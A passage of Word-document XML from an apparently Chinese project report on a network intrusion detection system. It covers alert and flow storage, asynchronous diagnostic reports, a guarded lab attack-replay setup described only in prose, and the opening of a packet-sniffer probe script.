        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>告警与流是分开存的：每条流都留档（含原始特征），只有非 BENIGN 的升级成告警。误报分析、召回率复盘都要靠 flows 表，丢掉就没法复盘。这一点在 3.7 节里救过一次——演示时有一分钟产生了 21 条 PortScan 误报，正是靠流表里的原始特征才定位到“数据集 BENIGN 行里约 48% 是单包短流”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C2D06B">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>告警产生后，服务把诊断任务丢进 FastAPI 的 BackgroundTasks，接口立即返回，不阻塞上报方；看板轮询时再取报告。这样大模型慢或挂掉，检测链路照常工作，只是报告变成模板版并在界面上标注。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BABCC07">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.2.4 攻击复现与安全护栏</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB5A1AE">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>攻击复现用于验证检测链路与做对照实验，共三支：端口扫描、SYN 洪泛、ping 洪泛，都用 scapy 自行构造报文，nmap 仅作对照组的参照。三支脚本共用一层安全护栏（attack/common.py）：目标地址必须落在本人授权的实验网段白名单内，发包速率与总次数各有上限，超出即中止。**这些脚本仅限在本人授权的实验网段内使用，不得对任何第三方目标运行。**</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECAC2C0">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>需要如实说明的是，由于答辩机没有抓包权限，攻击复现与检测链路的联动没有在真实网卡上跑通过；端口扫描与 SYN 洪泛的效果验证依赖的是数据集回放与规则引擎的窗口判据实测（3.5 节）。这项验证在拿到带 CAP_NET_RAW 的机器后应当补做。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACF8068">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.2.5 M10 双探针联动：设计完成、未联调</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1718DF58">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>M10 的设计是：两台探针使用同一中心、同一令牌，靠 probe_id 区分；中心按 probe_id 聚合，看板提供按探针过滤的能力；演示场景是一台探针看正常业务、另一台发起攻击，用两台机器的视角对比“同一段攻击在两个位置看到的样子”。数据层面的准备已经完成（探针编号贯穿上报、存储、告警、查询全链路，看板与历史查询都支持按探针过滤），端到端演示没有做——第二台机器未到位，且两边都没有抓包权限。这一项记为未完成，列入后续工作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5567E1CE">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.2.6 本部分完整代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B39009">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>以下五个文件为本部分全部代码，按“探针 → 上报 → 中心服务 → 存储 → 攻击复现”的顺序排列。代码中原有的注释一并保留，因为其中相当一部分记录的是“为什么这样写”而不是“这段在做什么”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="570DC750">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-6　probe/sniffer.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（245 行）　M1 抓包与会话聚合</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139B3813">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""M1/M6 边缘探针：抓包 → 解析 → 聚成流 → 周期性上报中心服务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D38FF92">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AA4F528">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>用法::</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7885041A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71F42054">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    sudo python3 -m probe.sniffer --iface eth0 --center http://127.0.0.1:8000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4965A474">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 只看不报（验证抓包与特征是否正常）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F923D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    python3 -m probe.sniffer --iface eth0 --dry-run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7493E2AC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 顺便落 pcap 和特征 CSV，供报告与 Wireshark 对照</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C5F3F0E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    sudo python3 -m probe.sniffer --iface eth0 --pcap data/pcap/run.pcap --csv data/features/run.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="115835A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46F9555D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>抓包需要 root 或 CAP_NET_RAW。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB3521D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F6695F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>一点实现上的取舍：上报发生在**流结束时**（FIN/RST、120 s 空闲、或存活超过 --max-age）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012DC801">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>按窗口上报活跃流会让同一条流被重复判定、重复告警，而特征也还没定型。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD494E2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>代价是长连接会被 --max-age 截成几段，每段时长只是真实时长的一部分——这个口径要在报告里写清楚。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4555B0EB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B6C4A73">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00CA305D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F89D49C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C732384">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C20BA11">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="040E7B1B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287A6F5B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="489B7A4F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06262288">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import threading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C557214">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="229448C4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A0CE6DE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C5309D3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from probe.features import FEATURE_ORDER, FlowTable, PacketRecord, flow_features, to_vector</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16979A60">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A0D83ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348272B4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from probe.reporter import Reporter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="403147B4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>except ImportError:  # 直接 python probe/sniffer.py 时的退路</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE4BB3F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    sys.path.insert(0, str(Path(__file__).resolve().parent.parent))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A41D9F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from probe.reporter import Reporter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05397BA5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30791862">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68501847">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def load_feature_names(path: str | None) -&gt; list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AABFDB9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """列序从训练产物里取，不在这里另抄一份。抄一份就等于埋了一个会静默漂移的副本。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF674D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E89F877">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return list(FEATURE_ORDER)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C3049AC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    p = Path(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD637A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not p.exists():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8ECE15">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise SystemExit(f"找不到特征 schema：{p}（先跑 models/train.py 生成）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52BC717B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    schema = json.loads(p.read_text(encoding="utf-8"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45100CE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    names = schema.get("feature_names")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5384BBF2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not names:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="026A48A0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise SystemExit(f"{p} 里没有 feature_names")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A1DD617">
      <w:pPr>
